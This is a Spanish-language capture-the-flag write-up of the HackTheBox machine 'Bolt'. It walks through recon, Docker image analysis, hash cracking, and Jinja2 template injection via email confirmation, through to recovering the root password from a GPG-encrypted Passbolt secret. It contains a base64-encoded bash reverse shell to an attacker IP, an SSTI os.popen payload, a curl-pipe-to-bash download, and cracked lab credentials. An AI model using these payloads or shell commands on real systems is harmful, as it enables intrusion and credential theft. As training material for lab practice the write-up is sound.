# 10.10.11.114 - Bolt

![Bolt](https://user-images.githubusercontent.com/96772264/204356998-dea6b45d-78e4-40aa-a3ca-22b6d9b41c75.png)

-------------------
# Part 1: Reconocimiento básico

Puertos abiertos 22(ssh), 80(http), 443(https). Nmap dice que:
- Puerto 80: nginx
- Puerto 443: Passbolt (gestor de contraseñas open soyrde) passbolt.bolt.htb

Añado en el /etc/hosts -> bolt.htb y passbolt.bolt.htb.  
Si hago una peticion a bolt.htb -> "auth/login?redirect=/"   
En el navegador sale una página en blanco pero al inspeccionar sale como un banner del programa "Passbolt" y su subdominio.  

Si se hace por curl no se aplica la redirección. ```curl -s http://bolt.htb```
De ahí se puede sacar que usan "Admin LTE" y tres nombres: Joseph Garth, Bonnie Green, Jose Leos  
Si meto uno como test@bolt.htb dice que no está aprovado. Intente con los que obtuve como joseph.garth@bolt.htb  pero nada.  
![bolt1](https://user-images.githubusercontent.com/96772264/204357198-6cd9c7ef-48d8-41a1-933c-e595ff18edac.PNG)

Si pongo la ip 10.10.11.114 si que me resuelve:  

![bolt2](https://user-images.githubusercontent.com/96772264/204357209-15ab8c85-5894-48ff-bf60-890b96b34e52.PNG)

-------------------
# Part 2: Docker Analisis 

Una de las páginas es download, donde nos ofrecen una imagen docker. Es un archivo tar que al descomprimirlo se ve asi
```console
└─$ ls
 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
# Como 7 archivos de estos más...
 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json
 manifest.json
 repositories
```
Si haces ```tree -fas``` ves que cada carpeta larga de estas tiene una archivo json otra layer.tar y otra VERSION.
Nos interesa el tar porque digamos que es un trozo de una imagen docker (o sea como una máquina virtual pero mas simple)
```console
└─$ tree -fas | grep "layer.tar" | awk '{print $NF}'
./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar
./1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar
./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar
# Y 8 mas
└─$ for file in $(tree -fas | grep "layer.tar" | awk '{print $NF}'); do echo "$file: "; 7z l $file; done > index.txt;
└─$ cat index.txt | grep -vE "terminfo|lib|cache|static"

# ./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950  # archivos de configuracion /etc
# ./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa  # archivos de la web 
# ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2  # archivo sqlite
# ./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf  # arhivos de la app de python
# ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab  # mas archivos de la web
```
En el docker tenemos:
- usaurios ->  root, operator, postgress  
- corre cada 15 min estos run-parts /etc/periodic/15min  
- gunicorn en el puerto 5005   
- config.py:   
	SECRET_KEY: 'S#perS3crEt_007'  
	mail puerto 25 support@bolt.htb  
	base_de_datos: 127.0.0.1:5432 appseed:pass   postgresql/appseed-flask  

```console
└─$ sqlite3 db.sqlite3
sqlite> .tables  # User
sqlite> select * from User;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||

└─$ john hash -w=/usr/share/wordlists/rockyou.txt
deadbolt	(?)
```
Entramos con admin:deadbolt

En la seccion de correos un tal Alexander Pierce nos ha bombardeado con emails diciendo que hay un problema con AdminLTE 3.0.
![bolt3](https://user-images.githubusercontent.com/96772264/204357340-5adaf59f-f0cb-47d7-bac4-7327855e6193.PNG)

En la parte de /profile hay mensajes de prueba de Jonathan Burke Jr., Sarah Ross y Adam Jones

-------------------
# Part 3: STTI

Como no sabemos que mas hacer podemos buscar subdominios:
```console
└─$ wfuzz -c --hl 504 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.bolt.htb" -u http://bolt.htb/ -t 100
000000038:   302        3 L      24 W       219 Ch      "demo"                                               
000000002:   200        98 L     322 W      4943 Ch     "mail" 
```

demo.bolt.htb y main.bolt.htb nos piden creds, pero no funcionan la de antes 
En /demo nos podemos registrar, pero nos piden un "codigo de invitacion" Vamos a ver si lo encontramos en el repo
```console
└─$ grep -ri "invite code" --text
└─$ grep -ri "invite code" --text
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar
# Se vuelve a hacer un 7z x de los dos
└─$ grep -ri "invite code"
app/base/templates/accounts/register.html
app/base/forms.py  # En forms.py encontramos que el campo se llama invite_code
└─$ grep -ri "invite_code"
app/base/routes.py # -> XNSS-HSJW-3NGU-8XTJ
```
![bolt4](https://user-images.githubusercontent.com/96772264/204357522-839b5bfc-3466-4a9d-86a2-e4657457ae06.PNG)

Nos creamos un usaurio en esta seccion: cucuxii:cucuxii@bolt.htb con esta llave. Entramos en una web casi identica a 10.10.11.114/admin solo que existe ademas 
la seccion de Settings -> "Se requiere una verificacion por email para actualizar inofrmación personal"

En efecto nos llega un email al subdominio de mail (done nos logueamos con la misma cuenta) y le damos a confirmar. En el perfil no cambia nada pero nos 
llega otro mail diciendo que se ha efectuado el cambio "test"
![bolt5](https://user-images.githubusercontent.com/96772264/204357561-f0c0e927-0c12-4ee9-b48e-232f6abd0732.PNG)
![bolt6](https://user-images.githubusercontent.com/96772264/204357579-2f85c332-9252-4b0b-a9cd-13d2cecec1d2.PNG)
![bolt7](https://user-images.githubusercontent.com/96772264/204357594-73fa7c76-f2bd-42d8-aa24-35c9681af8ee.PNG)

Como se refleja el output podemos robar un payload STTI {{7\*7}} Nos llega otro email con la palabra 49, o sea todo funciona.

```console
└─$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.16/666 0>&1'" | base64  -w0
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi82NjYgMD4mMScK
#{{cycler.__init__.__globals__.os.popen('echo YmFz... | base64 -d | bash').read()}}
```
Al darle al email de confirmacion, si nos hemos puesto en escucha con nc ```sudo nc -nlvp 666```


-------------------
# Part 4: En el sistema

Si nos ponemos a analizar el sistema con nuestro [script](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh)
```console
www-data@bolt:/tmp$ curl -s http://10.10.14.16/lin_info_xii.sh | bash
```
- Usuarios: root, eddie y clark, nosotros somos www-data     
- Existe la ruta /var/mail, reflejo del subdominio de mail, interesante si pudieramos leer el de eddie  -> permiso denegado
- Logs donde pueden haber creds: /var/log/nginx/passbolt-access.log /var/log/passbolt/error.log   
- EN /etc/passbolt hay una capreta gpg -> (hay llaves GPG dentro) y tambien un passbolt.conf con creds para la base de datos "passbolt:rT2;jW7<eY8!dX8}pQ8%"
- El puerto 3306 o sea sql está abierto   

```console
www-data@bolt:/etc/passbolt$ mysql -upassbolt -p
Enter password: rT2;jW7<eY8!dX8}pQ8%
mysql> show databases;  # passboltdb
mysql> use passboltdb;
mysql> show tables; 
# 'users' no tiene nada, pero 'secret' tiene un mensaje GPG (se ve de un formato similar a las llaves)

-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
...
```
Esta contraseña sirve para loguearse como eddie. Intento romper la llave privada con gpg2jhon pero no hay suerte

-------------------
# Part 5: Llave GPG escondida

Si corro el script otra vez, eddie posee muchos archivos .config/google-chrome/
En la busqueda de backups tambien nos muestran esta carpeta, en concreto carpeta Default con muchos archivos que acaban en "000003.log"

En la carpeta de /google-chrome hay demasiadas cosas asi que hacemos un filtrado por cosas como "gpg" o "passbolt" ```grep -riE "passbolt|gpg"```   
Damos con esta ruta todo el rato ```Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js``` pero no está está la llave GPG aunque la mencionan.
Buscamos a ver si esta ruta existe en otro lado: ```grep -ri "didegimhafipceonhjepacocaffmoppf"``` y damos con: "/Private Local Extension/Settings/"  

Dentro hay un archivo extremadamente largo llamado cat 000003.log con llaves gpg en un one liner (o sea hechas un churro)  
```
-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDq
```
Abrimos una al azar con VIM y la formateamos bien: -> ```:%s/\\\\r/\r/g y :%s/\\\\n//g  ```  
```console
└─$ gpg2john llave1.key > hash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
merrychristmas   (Eddie Johnson)
└─$ gpg --import llave1.key  # metes la contraseña merrychristmas
└─$ gpg -d message
gpg: cifrado con clave de 2048 bits RSA, ID F65CA879A3D77FE4, creada el 2021-02-25
      "Eddie Johnson <eddie@bolt.htb>"
{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}gpg: Firmado el sáb 06 mar 2021 16:33:54 CET
```
Esa es la contraseña de root.

